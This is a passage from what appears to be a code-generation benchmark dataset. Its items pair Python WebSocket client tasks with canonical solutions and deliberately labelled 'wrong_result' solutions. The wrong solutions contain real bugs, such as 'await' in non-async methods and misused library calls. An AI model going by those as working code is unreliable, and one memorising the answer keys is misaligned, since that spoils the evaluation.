r = await self._ws.recv()\n        msg = msgpack.unpackb(r)\n        if msg[0]['T'] == 'error':\n            raise ValueError(msg[0].get('msg', 'auth failed'))\n        if msg[0]['T'] != 'success' or msg[0]['msg'] != 'authenticated':\n            raise ValueError('failed to authenticate')\n\n    async def _start_ws(self):\n        await self._connect()\n        await self._auth()\n\n    async def close(self):\n        if self._ws:\n            await self._ws.close()\n            self._ws = None\n            self._running = False\n\n    async def stop_ws(self):\n        self._should_run = False\n        if self._stop_stream_queue.empty():\n            self._stop_stream_queue.put_nowait({\"should_stop\": True})\n\n    async def _consume(self):\n        while True:\n            if not self._stop_stream_queue.empty():\n                self._stop_stream_queue.get(timeout=1)\n                await self.close()\n                break\n            else:\n                try:\n                    r = await asyncio.wait_for(self._ws.recv(), 5)\n                    msgs = msgpack.unpackb(r)\n                    for msg in msgs:\n                        await self._dispatch(msg)\n                except asyncio.TimeoutError:\n                    pass\n\n    async def _dispatch(self, msg):\n        msg_type = msg.get('T')\n        symbol = msg.get('S')\n        if msg_type == 't':\n            handler = self._handlers['trades'].get(\n                symbol, self._handlers['trades'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'q':\n            handler = self._handlers['quotes'].get(\n                symbol, self._handlers['quotes'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'b':\n            handler = self._handlers['bars'].get(\n                symbol, self._handlers['bars'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'u':\n            handler = self._handlers['updatedBars'].get(\n                symbol, self._handlers['updatedBars'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'd':\n            handler = self._handlers['dailyBars'].get(\n                symbol, self._handlers['dailyBars'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'error':\n            log.error(f'error: {msg.get(\"msg\")} ({msg.get(\"code\")})')\n\n    def _subscribe(self, handler, symbols, handlers):\n        for symbol in symbols:\n            handlers[symbol] = handler\n        if self._running:\n            asyncio.run_coroutine_threadsafe(\n                self._subscribe_all(), self._loop\n            ).result()\n\n    async def _subscribe_all(self):\n        msg = defaultdict(list)\n        for k, v in self._handlers.items():\n            if v:\n                for s in v.keys():\n                    msg[k].append(s)\n        msg['action'] = 'subscribe'\n        bs = msgpack.packb(msg)\n        frames = (bs[i:i+self._max_frame_size]\n                  for i in range(0, len(bs), self._max_frame_size))\n        await self._ws.send(frames)\n\n    async def _run_forever(self):\n        self._loop = asyncio.get_running_loop()\n        while not any(v for k, v in self._handlers.items()):\n            if not self._stop_stream_queue.empty():\n                self._stop_stream_queue.get(timeout=1)\n                return\n            await asyncio.sleep(0.1)\n        self._should_run = True\n        self._running = False\n        while True:\n            try:\n                if not self._should_run:\n                    return\n                if not self._running:\n                    await self._start_ws()\n                    await self._subscribe_all()\n                    self._running = True\n                await self._consume()\n            except websockets.WebSocketException as wse:\n                await self.close()\n                self._running = False\n            finally:\n                await asyncio.sleep(0.01)\n\n    def subscribe_trades(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['trades'])\n\n    def subscribe_quotes(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['quotes'])\n\n    def subscribe_bars(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['bars'])\n\n    def subscribe_updated_bars(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['updatedBars'])\n\n    def subscribe_daily_bars(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['dailyBars'])\n\n    def stop(self):\n        if self._loop.is_running():\n            asyncio.run_coroutine_threadsafe(\n                self.stop_ws(),\n                self._loop).result()",
    "Code_level": "Class-level",
    "FSMID_for_test": 46,
    "wrong_result": "import asyncio\nimport json\nimport ssl\nimport typing\nfrom collections import defaultdict\nfrom queue import Queue\nfrom typing import Dict, List, Callable, Optional, Any\n\nclass DataStream:\n    def __init__(self, endpoint: str, key_id: str, secret_key: str, raw_data: bool = False, websocket_params: Optional[Dict] = None) -> None:\n        self._endpoint = endpoint\n        self._key_id = key_id\n        self._secret_key = secret_key\n        self._ws = None\n        self._running = False\n        self._loop = asyncio.get_event_loop()\n        self._raw_data = raw_data\n        self._stop_stream_queue = Queue()\n        self._handlers = defaultdict(dict)\n        self._name = f\"DataStream_{key_id}\"\n        self._should_run = True\n        self._max_frame_size = 1024 * 1024 * 8  # 8MB\n        self._websocket_params = websocket_params or {}\n\n    async def _connect(self) -> None:\n        self._ws = await self._loop.create_connection(\n            lambda: WebSocketClientProtocol(self), \n            self._endpoint, \n            **self._websocket_params\n        )\n\n    async def _auth(self) -> None:\n        auth_message = {\n            \"type\": \"auth\",\n            \"key_id\": self._key_id,\n            \"secret_key\": self._secret_key\n        }\n        await self._ws.send_json(auth_message)\n\n    async def _start_ws(self) -> None:\n        await self._connect()\n        await self._auth()\n        await self._consume()\n\n    def close(self) -> None:\n        if self._ws:\n            self._ws.close()\n            self._ws = None\n\n    def stop_ws(self) -> None:\n        self._stop_stream_queue.put(True)\n\n    async def _consume(self) -> None:\n        while self._should_run and not self._stop_stream_queue.empty():\n            try:\n                message = await self._ws.receive_json()\n                if message:\n                    self._dispatch(message)\n            except Exception as e:\n                print(f\"Error consuming message: {e}\")\n                break\n\n    def _dispatch(self, msg: Dict) -> None:\n        if \"type\" in msg:\n            handler = self._handlers[msg[\"type\"]]\n            if callable(handler):\n                handler(msg)\n            else:\n                print(f\"No handler found for message type: {msg['type']}\")\n\n    def _subscribe(self, handler: Callable, symbols: List[str], handlers: Dict) -> None:\n        for symbol in symbols:\n            if symbol not in handlers:\n                handlers[symbol] = {}\n            handlers[symbol][handler.__name__] = handler\n\n    def _subscribe_all(self) -> None:\n        for symbol, handlers in self._handlers.items():\n            for handler_name, handler in handlers.items():\n                self._subscribe(handler, [symbol], self._handlers)\n\n    async def _run_forever(self) -> None:\n        while self._should_run:\n            try:\n                await self._start_ws()\n                await asyncio.sleep(1)\n            except Exception as e:\n                print(f\"Error in run_forever: {e}\")\n                self._should_run = False\n\n    def subscribe_trades(self, handler: Callable, *symbols: str) -> None:\n        self._subscribe(handler, list(symbols), self._handlers)\n\n    def subscribe_quotes(self, handler: Callable, *symbols: str) -> None:\n        self._subscribe(handler, list(symbols), self._handlers)\n\n    def subscribe_bars(self, handler: Callable, *symbols: str) -> None:\n        self._subscribe(handler, list(symbols), self._handlers)\n\n    def subscribe_updated_bars(self, handler: Callable, *symbols: str) -> None:\n        self._subscribe(handler, list(symbols), self._handlers)\n\n    def subscribe_daily_bars(self, handler: Callable, *symbols: str) -> None:\n        self._subscribe(handler, list(symbols), self._handlers)\n\n    def stop(self) -> None:\n        self._should_run = False\n        self.stop_ws()\n        self.close()"
  },
  {
    "Task_id": 440,
    "Instruction": "Task Description: Create a WebSocket client in Python using asyncio and websockets libraries to connect to a WebSocket server, subscribe to a channel, and receive messages, optionally decompressing them if they are gzipped.\n\nFunction Description: The function establishes a WebSocket connection to a specified URI, sends a subscription message, and receives a specified number of messages from the server. It can handle gzip-compressed messages by decompressing them before display.\n\nInput:\n- uri (str): The WebSocket server URI to connect to (e.g., 'wss://api.huobi.pro/ws').\n- sub (str): The subscription message to send to the server (e.g., '{\"sub\": \"market.btcusdt.trade.detail\", \"id\": 4}').\n- is_gzip (bool): A flag indicating whether the received messages are gzip-compressed.\n- count (int): The number of messages to receive before exiting.\n\nOutput: None (The function prints received messages to the console).",
    "Canonical_solution": "import argparse\nimport asyncio\nimport zlib\nimport websockets\n\nasync def websocket_client(uri, sub, is_gzip, count):\n    async with websockets.connect(uri) as websocket:\n        await websocket.send(sub)\n        print(f\"> {sub}\")\n\n        for i in range(count):\n            response = await websocket.recv()\n            if not is_gzip:\n                print(f\"< {response}\")\n            else:\n                print(f\"< {zlib.decompress(response, 16 + zlib.MAX_WBITS)}\")\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--uri', default='wss://api.huobi.pro/ws', help='URI to connect to')\n    parser.add_argument('--sub', default='{\"sub\": \"market.btcusdt.trade.detail\", \"id\": 4}', help='Subscription string')\n    parser.add_argument('--count', default=3, type=int, help='Number of messages to receive before exiting')\n    parser.add_argument('-z', action='store_true', help='Use gzip on messages')\n    args = parser.parse_args()\n\n    asyncio.get_event_loop().run_until_complete(\n        websocket_client(args.uri, args.sub, args.z, args.count)\n    )",
    "Code_level": "Function-level",
    "FSMID_for_test": 46,
    "wrong_result": "import asyncio\nimport websockets\nimport gzip\nimport json\n\nasync def websocket_client(uri, sub, is_gzip, count):\n    async with websockets.connect(uri) as websocket:\n        await websocket.send(sub)\n        for i in range(count):\n            message = await websocket.recv()\n            if is_gzip:\n                decompressed = gzip.decompress(message)\n                decoded = decompressed.decode('utf-8')\n                print(decoded)\n            else:\n                print(message)\n\n# Example usage:\n# asyncio.get_event_loop().run_until_complete(websocket_client(\"wss://api.huobi.pro/ws\", '{\"sub\": \"market.btcusdt.trade.detail\", \"id\": 4}', True, 5))"
  },
  {
    "Task_id": 441,
    "Instruction": "Task Description: Implement a WebSocket client class for chat functionality that handles connection, message sending/receiving, and error handling with proper thread management.\n\nClass Description: ChatNewWebSocket is a WebSocket client implementation for chat applications that manages WebSocket connections, message queuing, and event callbacks in separate threads. It provides methods for starting/stopping connections, sending messages, and handling WebSocket events.\n\nAttributes:\n- _parent: [weakref.ref] - Weak reference to the parent object for callback handling\n- ws: [WebSocketApp] - WebSocketApp instance for managing the connection\n- _inQueue: [Queue] - Thread-safe queue for outgoing messages\n- sendThread: [Thread] - Thread for processing outgoing messages\n\nMethods:\n- __init__(parent) -> None - Initializes the WebSocket client with parent reference and starts send thread\n- parent() -> object - Property to dereference the weak parent reference\n- Stop() -> None - Stops the send thread by putting empty string in queue\n- SendDataRun() -> None - Thread target function that processes outgoing messages from queue\n- _SendData(data) -> None - Internal method to send data through WebSocket and emit appropriate events\n- _Send(msg) -> None - Internal method to send raw message through WebSocket\n- Send(data) -> None - Public method to queue data for sending\n- on_message(ws, message) -> None - Callback for received WebSocket messages\n- on_error(ws, error) -> None - Callback for WebSocket errors\n- on_close(ws) -> None - Callback for WebSocket connection close\n- on_open(ws) -> None - Callback for WebSocket connection open\n- Start(roomId, token, url) -> None - Starts WebSocket connection with given parameters in new thread\n- Close() -> None - Closes active WebSocket connection",
    "Canonical_solution": "import threading\nimport weakref\nfrom queue import Queue\nimport websocket\n\nclass ChatNewWebSocket:\n    def __init__(self, parent):\n        self._parent = weakref.ref(parent)\n        self.ws = None\n        self._inQueue = Queue()\n        self.sendThread = threading.Thread(target=self.SendDataRun)\n        self.sendThread.setName(\"ChatSendThread\")\n        self.sendThread.setDaemon(True)\n        self.sendThread.start()\n\n    @property\n    def parent(self):\n        return self._parent()\n\n    def Stop(self):\n        self._inQueue.put(\"\")\n\n    def SendDataRun(self):\n        while True:\n            task = self._inQueue.get(True)\n            self._inQueue.task_done()\n            try:\n                if task == \"\":\n                    break\n                self._SendData(task)\n            except Exception as es:\n                pass\n\n    def _SendData(self, data):\n        self._Send(data)\n        if \"send_image\" in data:\n            self.parent.websocket.emit(self.parent.SendImg, data)\n        else:\n            self.parent.websocket.emit(self.parent.SendMsg2, data)\n\n    def _Send(self, msg):\n        try:\n            if self.ws:\n                self.ws.send(msg)\n        except Exception as es:\n            pass\n\n    def Send(self, data):\n        self._inQueue.put(data)\n\n    def on_message(self, ws, message):\n        self.parent.websocket.emit(self.parent.Msg, message)\n\n    def on_error(self, ws, error):\n        self.parent.websocket.emit(self.parent.ErrorMsg, str(error))\n\n    def on_close(self, ws):\n        self.parent.websocket.emit(self.parent.Leave, \"\")\n\n    def on_open(self, ws):\n        self.parent.websocket.emit(self.parent.Enter, \"\")\n\n    def Start(self, roomId, token, url):\n        url = url.replace(\"https\", \"wss\").replace(\"http\", \"ws\") + \"?token={}&room={}\".format(token, roomId)\n        def Run():\n            ws = websocket.WebSocketApp(url,\n                                      on_open=self.on_open,\n                                      on_message=self.on_message,\n                                      on_error=self.on_error,\n                                      on_close=self.on_close)\n            self.ws = ws\n            ws.run_forever(ping_interval=30)\n\n        thread = threading.Thread(target=Run)\n        thread.setDaemon(True)\n        thread.start()\n\n    def Close(self):\n        if self.ws:\n            self.ws.close()\n            self.ws = None",
    "Code_level": "Class-level",
    "FSMID_for_test": 47,
    "wrong_result": "import threading\nimport queue\nimport websockets\nimport asyncio\nfrom weakref import ref\nimport json\n\nclass ChatNewWebSocket:\n    def __init__(self, parent):\n        self._parent = ref(parent)\n        self.ws = None\n        self._inQueue = queue.Queue()\n        self.sendThread = threading.Thread(target=self.SendDataRun)\n        self.sendThread.start()\n\n    @property\n    def parent(self):\n        return self._parent() if self._parent() else None\n\n    def Stop(self):\n        self._inQueue.put(\"\")\n\n    def SendDataRun(self):\n        while True:\n            data = self._inQueue.get()\n            if data == \"\":\n                break\n            self._SendData(data)\n            self._inQueue.task_done()\n\n    def _SendData(self, data):\n        if self.ws and self.ws.open:\n            self._Send(data)\n            if self.parent():\n                self.parent().on_message(self.ws, data)\n\n    def _Send(self, msg):\n        if self.ws and self.ws.open:\n            self.ws.send(msg)\n\n    def Send(self, data):\n        self._inQueue.put(data)\n\n    def on_message(self, ws, message):\n        if self.parent():\n            self.parent().on_message(ws, message)\n\n    def on_error(self, ws, error):\n        if self.parent():\n            self.parent().on_error(ws, error)\n\n    def on_close(self, ws):\n        if self.parent():\n            self.parent().on_close(ws)\n\n    def on_open(self, ws):\n        if self.parent():\n            self.parent().on_open(ws)\n\n    def Start(self, roomId, token, url):\n        self.ws = websockets.connect(url, extra_headers={\"Authorization\": f\"Bearer {token}\"})\n        self.ws.on_message = self.on_message\n        self.ws.on_error = self.on_error\n        self.ws.on_close = self.on_close\n        self.ws.on_open = self.on_open\n\n    def Close(self):\n        if self.ws and self.ws.open:\n            self.ws.close()"
  },
  {
    "Task_id": 444,
    "Instruction": "Task Description: Implement a WebSocket client class in Python that establishes and manages connections to both control and data WebSocket servers, handles message exchange, and provides methods for parameter manipulation and audio data transmission.\n\nClass Description: WebSocketClient is a dual-connection WebSocket client that maintains separate connections for control commands and data transmission. It implements asynchronous communication with a server using callback-based event handling and provides thread-safe parameter operations.\n\nAttributes:\n- control_url: str - URL for the control WebSocket connection\n- data_url: str - URL for the data WebSocket connection\n- debug_mode: bool - Flag to enable debug output\n- is_running: bool - Flag indicating if the client is active\n- connection_established: threading.Event - Synchronization event for connection status\n- request_counter: int - Counter for generating unique request IDs\n- pending_requests: dict - Dictionary tracking pending parameter requests\n\nMethods:\n- __init__(control_url: str = DEFAULT_CONTROL_URL, data_url: str = DEFAULT_DATA_URL, debug_mode: bool = False) -> None - Initializes the WebSocket client with connection URLs and debug mode\n- connect() -> bool - Establishes connections to both control and data WebSocket servers\n- feed_audio(chunk: bytes, original_sample_rate: int = 16000) -> None - Sends audio data with metadata to the data WebSocket\n- on_control_message(ws: WebSocketApp, message: str) -> None - Callback for handling control channel messages\n- on_data_message(ws: WebSocketApp, message: str) -> None - Callback for handling data channel messages\n- on_error(ws: WebSocketApp, error: Exception) -> None - Callback for WebSocket errors\n- on_close(ws: WebSocketApp, close_status_code: int, close_msg: str) -> None - Callback for connection close events\n- on_control_open(ws: WebSocketApp) -> None - Callback for control connection opening\n- on_data_open(ws: WebSocketApp) -> None - Callback for data connection opening\n- set_parameter(parameter: str, value: Any) -> None - Sends a parameter set command to the server\n- get_parameter(parameter: str) -> Optional[Any] - Requests a parameter value from the server and waits for response\n- call_method(method: str, args: Optional[List] = None, kwargs: Optional[dict] = None) -> None - Calls a remote method on the server\n- shutdown() -> None - Gracefully shuts down both WebSocket connections",
    "Canonical_solution": "from typing import List, Optional, Union\nfrom urllib.parse import urlparse\nfrom websocket import WebSocketApp\nfrom websocket import ABNF\nimport threading\nimport socket\nimport struct\nimport json\n\nDEFAULT_CONTROL_URL = \"ws://127.0.0.1:8011\"\nDEFAULT_DATA_URL = \"ws://127.0.0.1:8012\"\n\nclass WebSocketClient:\n    def __init__(self, control_url: str = DEFAULT_CONTROL_URL, data_url: str = DEFAULT_DATA_URL, debug_mode: bool = False):\n        self.control_url = control_url\n        self.data_url = data_url\n        self.debug_mode = debug_mode\n        self.is_running = True\n        self.connection_established = threading.Event()\n        self.request_counter = 0\n        self.pending_requests = {}  # Map from request_id to threading.Event and value\n\n    def connect(self):\n        try:\n            # Connect to control WebSocket\n            self.control_ws = WebSocketApp(self.control_url,\n                                         on_message=self.on_control_message,\n                                         on_error=self.on_error,\n                                         on_close=self.on_close,\n                                         on_open=self.on_control_open)\n\n            self.control_ws_thread = threading.Thread(target=self.control_ws.run_forever)\n            self.control_ws_thread.daemon = False\n            self.control_ws_thread.start()\n\n            # Connect to data WebSocket\n            self.data_ws = WebSocketApp(self.data_url,\n                                      on_message=self.on_data_message,\n                                      on_error=self.on_error,\n                                      on_close=self.on_close,\n                                      on_open=self.on_data_open)\n\n            self.data_ws_thread = threading.Thread(target=self.data_ws.run_forever)\n            self.data_ws_thread.daemon = False\n            self.data_ws_thread.start()\n\n            # Wait for the connections to be established\n            if not self.connection_established.wait(timeout=10):\n                if self.debug_mode:\n                    print(\"Timeout while connecting to the server.\")\n                return False\n\n            if self.debug_mode:\n                print(\"WebSocket connections established successfully.\")\n            return True\n        except Exception as e:\n            if self.debug_mode:\n                print(f\"Error while connecting to the server: {e}\")\n            return False\n\n    def feed_audio(self, chunk, original_sample_rate=16000):\n        metadata = {\"sampleRate\": original_sample_rate}\n        metadata_json = json.dumps(metadata)\n        metadata_length = len(metadata_json)\n        message = struct.pack('<I', metadata_length) + metadata_json.encode('utf-8') + chunk\n\n        if self.is_running:\n            self.data_ws.send(message, opcode=ABNF.OPCODE_BINARY)\n\n    def on_control_message(self, ws, message):\n        try:\n            data = json.loads(message)\n            if 'status' in data:\n                if data['status'] == 'success':\n                    if 'parameter' in data and 'value' in data:\n                        request_id = data.get('request_id')\n                        if request_id is not None and request_id in self.pending_requests:\n                            if self.debug_mode:\n                                print(f\"Parameter {data['parameter']} = {data['value']}\")\n                            self.pending_requests[request_id]['value'] = data['value']\n                            self.pending_requests[request_id]['event'].set()\n                elif data['status'] == 'error':\n                    if self.debug_mode:\n                        print(f\"Server Error: {data.get('message', '')}\")\n            else:\n                if self.debug_mode:\n                    print(f\"Unknown control message format: {data}\")\n        except json.JSONDecodeError:\n            if self.debug_mode:\n                print(f\"Received non-JSON control message: {message}\")\n        except Exception as e:\n            if self.debug_mode:\n                print(f\"Error processing control message: {e}\")\n\n    def on_data_message(self, ws, message):\n        try:\n            data = json.loads(message)\n            if self.debug_mode:\n                print(f\"Received data message: {data}\")\n        except json.JSONDecodeError:\n            if self.debug_mode:\n                print(f\"Received non-JSON data message: {message}\")\n        except Exception as e:\n            if self.debug_mode:\n                print(f\"Error processing data message: {e}\")\n\n    def on_error(self, ws, error):\n        if self.debug_mode:\n            print(f\"WebSocket error: {error}\")\n\n    def on_close(self, ws, close_status_code, close_msg):\n        if self.debug_mode:\n            if ws == self.data_ws:\n                print(f\"Data WebSocket connection closed: {close_status_code} - {close_msg}\")\n            elif ws == self.control_ws:\n                print(f\"Control WebSocket connection closed: {close_status_code} - {close_msg}\")\n        \n        self.is_running = False\n\n    def on_control_open(self, ws):\n        if self.debug_mode:\n            print(\"Control WebSocket connection opened.\")\n        self.connection_established.set()\n\n    def on_data_open(self, ws):\n        if self.debug_mode:\n            print(\"Data WebSocket connection opened.\")\n\n    def set_parameter(self, parameter, value):\n        command = {\n            \"command\": \"set_parameter\",\n            \"parameter\": parameter,\n            \"value\": value\n        }\n        self.control_ws.send(json.dumps(command))\n\n    def get_parameter(self, parameter):\n        request_id = self.request_counter\n        self.request_counter += 1\n\n        command = {\n            \"command\": \"get_parameter\",\n            \"parameter\": parameter,\n            \"request_id\": request_id\n        }\n\n        event = threading.Event()\n        self.pending_requests[request_id] = {'event': event, 'value': None}\n\n        self.control_ws.send(json.dumps(command))\n\n        if event.wait(timeout=5):\n            value = self.pending_requests[request_id]['value']\n            del self.pending_requests[request_id]\n            return value\n        else:\n            if self.debug_mode:\n                print(f\"Timeout waiting for get_parameter {parameter}\")\n            del self.pending_requests[request_id]\n            return None\n\n    def call_method(self, method, args=None, kwargs=None):\n        command = {\n            \"command\": \"call_method\",\n            \"method\": method,\n            \"args\": args or [],\n            \"kwargs\": kwargs or {}\n        }\n        self.control_ws.send(json.dumps(command))\n\n    def shutdown(self):\n        self.is_running = False\n        if hasattr(self, 'control_ws'):\n            self.control_ws.close()\n        if hasattr(self, 'data_ws'):\n            self.data_ws.close()\n\n        if hasattr(self, 'control_ws_thread'):\n            self.control_ws_thread.join()\n        if hasattr(self, 'data_ws_thread'):\n            self.data_ws_thread.join()",
    "Code_level": "Class-level",
    "FSMID_for_test": 47,
    "wrong_result": "import asyncio\nimport websockets\nimport json\nimport threading\nfrom typing import Any, Optional, List, Dict, Tuple\nimport time\n\nclass WebSocketClient:\n    def __init__(self, control_url: str = \"ws://localhost:8765\", data_url: str = \"ws://localhost:8766\", debug_mode: bool = False):\n        self.control_url = control_url\n        self.data_url = data_url\n        self.debug_mode = debug_mode\n        self.is_running = False\n        self.connection_established = threading.Event()\n        self.request_counter = 0\n        self.pending_requests: Dict[str, Tuple[asyncio.Future, str]] = {}\n        self.control_ws: Optional[websockets.WebSocketClientProtocol] = None\n        self.data_ws: Optional[websockets.WebSocketClientProtocol] = None\n        self.control_connected = threading.Event()\n        self.data_connected = threading.Event()\n\n    async def connect(self) -> bool:\n        if self.is_running:\n            return False\n        self.is_running = True\n        await self._connect_control()\n        await self._connect_data()\n        self.connection_established.set()\n        return True\n\n    async def _connect_control(self):\n        try:\n            self.control_ws = await websockets.connect(self.control_url)\n            self.control_connected.set()\n            if self.debug_mode:\n                print(\"Control connection established\")\n        except Exception as e:\n            if self.debug_mode:\n                print(f\"Failed to connect to control server: {e}\")\n            return False\n        return True\n\n    async def _connect_data(self):\n        try:\n            self.data_ws = await websockets.connect(self.data_url)\n            self.data_connected.set()\n            if self.debug_mode:\n                print(\"Data connection established\")\n        except Exception as e:\n            if self.debug_mode:\n                print(f\"Failed to connect to data server: {e}\")\n            return False\n        return True\n\n    def feed_audio(self, chunk: bytes, original_sample_rate: int = 16000) -> None:\n        if not self.data_ws or not self.data_connected.is_set():\n            if self.debug_mode:\n                print(\"Data connection not established\")\n            return\n        message = {\n            \"type\": \"audio\",\n            \"chunk\": chunk,\n            \"sample_rate\": original_sample_rate\n        }\n        self.data_ws.send(json.dumps(message))\n\n    def on_control_message(self, ws: websockets.WebSocketClientProtocol, message: str) -> None:\n        if self.debug_mode:\n            print(f\"Control message received: {message}\")\n\n    def on_data_message(self, ws: websockets.WebSocketClientProtocol, message: str) -> None:\n        if self.debug_mode:\n            print(f\"Data message received: {message}\")\n\n    def on_error(self, ws: websockets.WebSocketClientProtocol, error: Exception) -> None:\n        if self.debug_mode:\n            print(f\"WebSocket error: {error}\")\n\n    def on_close(self, ws: websockets.WebSocketClientProtocol, close_status_code: int, close_msg: str) -> None:\n        if self.debug_mode:\n            print(f\"Connection closed: {close_status_code} {close_msg}\")\n        self.is_running = False\n        self.connection_established.clear()\n\n    def on_control_open(self, ws: websockets.WebSocketClientProtocol) -> None:\n        if self.debug_mode:\n            print(\"Control connection opened\")\n\n    def on_data_open(self, ws: websockets.WebSocketClientProtocol) -> None:\n        if self.debug_mode:\n            print(\"Data connection opened\")\n\n    def set_parameter(self, parameter: str, value: Any) -> None:\n        if not self.control_ws or not self.control_connected.is_set():\n            if self.debug_mode:\n                print(\"Control connection not established\")\n            return\n        message = {\n            \"type\": \"set_parameter\",\n            \"parameter\": parameter,\n            \"value\": value\n        }\n        self.control_ws.send(json.dumps(message))\n\n    def get_parameter(self, parameter: str) -> Optional[Any]:\n        if not self.control_ws or not self.control_connected.is_set():\n            if self.debug_mode:\n                print(\"Control connection not established\")\n            return None\n        request_id = f\"get_param_{self.request_counter}\"\n        self.request_counter += 1\n        future = asyncio.get_event_loop().create_future()\n        self.pending_requests[request_id] = (future, parameter)\n        message = {\n            \"type\": \"get_parameter\",\n            \"parameter\": parameter,\n            \"request_id\": request_id\n        }\n        self.control_ws.send(json.dumps(message))\n        try:\n            result = await future\n            return result\n        except Exception as e:\n            if self.debug_mode:\n                print(f\"Error getting parameter: {e}\")\n            return None\n\n    def call_method(self, method: str, args: Optional[List] = None, kwargs: Optional[Dict] = None) -> None:\n        if not self.control_ws or not self.control_connected.is_set():\n            if self.debug_mode:\n                print(\"Control connection not established\")\n            return\n        request_id = f\"call_method_{self.request_counter}\"\n        self.request_counter += 1\n        future = asyncio.get_event_loop().create_future()\n        self.pending_requests[request_id] = (future, method)\n        message = {\n            \"type\": \"call_method\",\n            \"method\": method,\n            \"request_id\": request_id,\n            \"args\": args or [],\n            \"kwargs\": kwargs or {}\n        }\n        self.control_ws.send(json.dumps(message))\n        try:\n            result = await future\n            return result\n        except Exception as e:\n            if self.debug_mode:\n                print(f\"Error calling method: {e}\")\n            return None\n\n    def shutdown(self) -> None:\n        if self.control_ws:\n            self.control_ws.close()\n        if self.data_ws:\n            self.data_ws.close()\n        self.is_running = False\n        self.connection_established.clear()"
  },
  {
    "Task_id": 447,
    "Instruction": "Task Description: Implement a WebSocket connection manager class for handling multiple client connections, supporting different subprotocols (JSON and BYTES), and managing message sending/receiving.\n\nClass Description: The ConnectionManager class manages active WebSocket connections, handles different WebSocket subprotocols, and provides methods for sending/receiving messages in the appropriate format.\n\nAttributes:\n- active_connections: List[WebSocket] - Maintains a list of currently active WebSocket connections\n- protocol_dict: Dict[str, WebsocketSubProtocols] - Maps client addresses to their chosen subprotocols\n\nMethods:\n- get_client(websocket: WebSocket) -> str - Returns a string identifier for the client (host:port)\n- get_subprotocol(headers: Dict) -> WebsocketSubProtocols - Determines the subprotocol from request headers\n- connect(websocket: WebSocket) -> None - Accepts a new WebSocket connection and stores its subprotocol\n- disconnect(websocket: WebSocket) -> None - Removes a disconnected WebSocket from active connections\n- receive(websocket: WebSocket) -> Any - Receives a message from the WebSocket using the appropriate subprotocol\n- iter(websocket: WebSocket) -> AsyncIterator[Any] - Provides an async iterator for continuously receiving messages\n- send(websocket: WebSocket, data: Union[DataRequest, StatusMessage]) -> None - Sends data through the WebSocket using the appropriate subprotocol",
    "Canonical_solution": "from typing import Any, AsyncIterator, Dict, List, Optional, Union\nfrom fastapi import FastAPI, Response, WebSocket, WebSocketDisconnect, status\nfrom jina.enums import WebsocketSubProtocols\nfrom jina.excepts import InternalNetworkError\nfrom jina.types.request.data import DataRequest\nfrom jina.types.request.status import StatusMessage\n\nclass ConnectionManager:\n    def __init__(self):\n        self.active_connections: List[WebSocket] = []\n        self.protocol_dict: Dict[str, WebsocketSubProtocols] = {}\n\n    def get_client(self, websocket: WebSocket) -> str:\n        return f'{websocket.client.host}:{websocket.client.port}'\n\n    def get_subprotocol(self, headers: Dict):\n        try:\n            if 'sec-websocket-protocol' in headers:\n                subprotocol = WebsocketSubProtocols(headers['sec-websocket-protocol'])\n            elif b'sec-websocket-protocol' in headers:\n                subprotocol = WebsocketSubProtocols(headers[b'sec-websocket-protocol'].decode())\n            else:\n                subprotocol = WebsocketSubProtocols.JSON\n        except Exception:\n            subprotocol = WebsocketSubProtocols.JSON\n        return subprotocol\n\n    async def connect(self, websocket: WebSocket):\n        await websocket.accept()\n        subprotocol = self.get_subprotocol(dict(websocket.scope['headers']))\n        self.active_connections.append(websocket)\n        self.protocol_dict[self.get_client(websocket)] = subprotocol\n\n    def disconnect(self, websocket: WebSocket):\n        self.protocol_dict.pop(self.get_client(websocket))\n        self.active_connections.remove(websocket)\n\n    async def receive(self, websocket: WebSocket) -> Any:\n        subprotocol = self.protocol_dict[self.get_client(websocket)]\n        if subprotocol == WebsocketSubProtocols.JSON:\n            return await websocket.receive_json(mode='text')\n        elif subprotocol == WebsocketSubProtocols.BYTES:\n            return await websocket.receive_bytes()\n\n    async def iter(self, websocket: WebSocket) -> AsyncIterator[Any]:\n        try:\n            while True:\n                yield await self.receive(websocket)\n        except WebSocketDisconnect:\n            pass\n\n    async def send(self, websocket: WebSocket, data: Union[DataRequest, StatusMessage]) -> None:\n        subprotocol = self.protocol_dict[self.get_client(websocket)]\n        if subprotocol == WebsocketSubProtocols.JSON:\n            return await websocket.send_json(data.to_dict(), mode='text')\n        elif subprotocol == WebsocketSubProtocols.BYTES:\n            return await websocket.send_bytes(data.to_bytes())",
    "Code_level": "Class-level",
    "FSMID_for_test": 48,
    "wrong_result": "class ConnectionManager:\n    def __init__(self):\n        self.active_connections = []\n        self.protocol_dict = {}\n\n    def get_client(self, websocket: WebSocket) -> str:\n        return f\"{websocket.remote_address[0]}:{websocket.remote_address[1]}\"\n\n    def get_subprotocol(self, headers: Dict) -> WebsocketSubProtocols:\n        subprotocol = headers.get(\"Sec-WebSocket-Protocol\")\n        if subprotocol and subprotocol in WebsocketSubProtocols:\n            return WebsocketSubProtocols[subprotocol]\n        return WebsocketSubProtocols.JSON\n\n    def connect(self, websocket: WebSocket) -> None:\n        subprotocol = self.get_subprotocol(websocket.headers)\n        self.protocol_dict[self.get_client(websocket)] = subprotocol\n        self.active_connections.append(websocket)\n\n    def disconnect(self, websocket: WebSocket) -> None:\n        client = self.get_client(websocket)\n        if client in self.protocol_dict:\n            del self.protocol_dict[client]\n        if websocket in self.active_connections:\n            self.active_connections.remove(websocket)\n\n    async def receive(self, websocket: WebSocket) -> Any:\n        message = await websocket.receive()\n        if message.type == \"text\":\n            return message.text\n        elif message.type == \"binary\":\n            return message.binary_data\n        return None\n\n    async def iter(self, websocket: WebSocket) -> AsyncIterator[Any]:\n        while True:\n            message = await websocket.receive()\n            if 